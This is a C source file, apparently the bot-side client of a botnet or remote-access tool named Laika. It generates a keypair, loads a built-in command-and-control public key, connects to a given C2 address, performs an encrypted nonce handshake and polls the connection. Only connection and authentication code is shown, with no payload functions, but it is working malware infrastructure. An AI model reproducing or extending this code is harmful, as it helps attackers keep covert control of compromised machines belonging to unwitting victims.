#include "lmem.h"
#include "lrsa.h"
#include "lerror.h"
#include "bot.h"

LAIKAPKT_SIZE laikaB_pktSizeTbl[LAIKAPKT_MAXNONE] = {
    [LAIKAPKT_HANDSHAKE_RES] = sizeof(uint8_t) + crypto_box_SEALBYTES + LAIKA_NONCESIZE
};

void laikaB_pktHandler(struct sLaika_peer *peer, LAIKAPKT_ID id, void *uData) {
    struct sLaika_bot *bot = (struct sLaika_bot*)uData;

    switch (id) {
        case LAIKAPKT_HANDSHAKE_RES: {
            uint8_t encNonce[crypto_box_SEALBYTES + LAIKA_NONCESIZE], nonce[LAIKA_NONCESIZE];
            uint8_t endianness = laikaS_readByte(&peer->sock);

            /* read & decrypt nonce */
            laikaS_read(&peer->sock, encNonce, sizeof(encNonce));
            if (crypto_box_seal_open(nonce, encNonce, crypto_box_SEALBYTES + LAIKA_NONCESIZE, bot->pub, bot->priv) != 0)
                LAIKA_ERROR("Failed to decrypt nonce!\n");

            /* check nonce */
            if (memcmp(nonce, bot->nonce, LAIKA_NONCESIZE) != 0)
                LAIKA_ERROR("Mismatched nonce!\n");

            peer->sock.flipEndian = endianness != laikaS_isBigEndian();
            LAIKA_DEBUG("handshake accepted by cnc!\n")
            break;
        }
        default:
            LAIKA_ERROR("unknown packet id [%d]\n", id);
    }
}

struct sLaika_bot *laikaB_newBot(void) {
    struct sLaika_bot *bot = laikaM_malloc(sizeof(struct sLaika_bot));
    size_t _unused;

    laikaP_initPList(&bot->pList);
    bot->peer = laikaS_newPeer(
        laikaB_pktHandler,
        laikaB_pktSizeTbl,
        &bot->pList,
        (void*)bot
    );
    laikaS_setKeys(bot->peer, bot->priv, bot->pub);

    /* generate keypair */
    if (sodium_init() < 0) {
        laikaB_freeBot(bot);
        LAIKA_ERROR("LibSodium failed to initialize!\n");
    }

    if (crypto_box_keypair(bot->pub, bot->priv) != 0) {
        laikaB_freeBot(bot);
        LAIKA_ERROR("Failed to gen keypair!\n");
    }

    if (sodium_hex2bin(bot->peer->peerPub, crypto_box_PUBLICKEYBYTES, LAIKA_PUBKEY, strlen(LAIKA_PUBKEY), NULL, &_unused, NULL) != 0) {
        laikaB_freeBot(bot);
        LAIKA_ERROR("Failed to init cnc public key!\n");
    }

    /* gen nonce test */
    randombytes_buf(bot->nonce, LAIKA_NONCESIZE);
    return bot;
}

void laikaB_freeBot(struct sLaika_bot *bot) {
    laikaP_cleanPList(&bot->pList);
    laikaS_freePeer(bot->peer);
    laikaM_free(bot);
}

void laikaB_connectToCNC(struct sLaika_bot *bot, char *ip, char *port) {
    uint8_t encNonce[crypto_box_SEALBYTES + LAIKA_NONCESIZE];
    struct sLaika_socket *sock = &bot->peer->sock;

    /* setup socket */
    laikaS_connect(sock, ip, port);
    laikaS_setNonBlock(sock);

    laikaP_addSock(&bot->pList, sock);

    /* encrypt nonce using cnc's pubkey */
    if (crypto_box_seal(encNonce, bot->nonce, sizeof(bot->nonce), bot->peer->peerPub) != 0)
        LAIKA_ERROR("Failed to enc nonce!\n");

    /* queue handshake request */
    laikaS_writeByte(sock, LAIKAPKT_HANDSHAKE_REQ);
    laikaS_write(sock, LAIKA_MAGIC, LAIKA_MAGICLEN);
    laikaS_writeByte(sock, LAIKA_VERSION_MAJOR);
    laikaS_writeByte(sock, LAIKA_VERSION_MINOR);
    laikaS_write(sock, encNonce, sizeof(encNonce)); /* write encrypted nonce test */
    laikaS_write(sock, bot->pub, sizeof(bot->pub)); /* write public key */

    if (!laikaS_handlePeerOut(bot->peer))
        LAIKA_ERROR("failed to send handshake request!\n")
}

bool laikaB_poll(struct sLaika_bot *bot, int timeout) {
    struct sLaika_pollEvent *evnt;
    int numEvents;

    evnt = laikaP_poll(&bot->pList, timeout, &numEvents);

    if (numEvents == 0) /* no events? timeout was reached */
        return false;

LAIKA_TRY
    if (evnt->pollIn && !laikaS_handlePeerIn(bot->peer))
        goto _BOTKILL;

    if (evnt->pollOut && !laikaS_handlePeerOut(bot->peer))
        goto _BOTKILL;

    if (!evnt->pollIn && !evnt->pollOut)
        goto _BOTKILL;
LAIKA_CATCH
_BOTKILL:
    laikaS_kill(&bot->peer->sock);
LAIKA_TRYEND

    return true;
}